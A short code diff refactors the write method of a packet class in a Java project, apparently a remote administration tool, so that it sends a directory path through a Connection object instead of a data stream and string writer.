@@ -1,8 +1,7 @@
 package jrat.module.fs.packets;
 
+import jrat.client.Connection;
 import jrat.client.packets.outgoing.AbstractOutgoingPacket;
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
 
 
 public class Packet34CustomDirectory extends AbstractOutgoingPacket {
@@ -14,8 +13,8 @@ public class Packet34CustomDirectory extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		sw.writeLine(this.location);
+	public void write(Connection con) throws Exception {
+        con.writeLine(this.location);
 	}
 
 	@Override
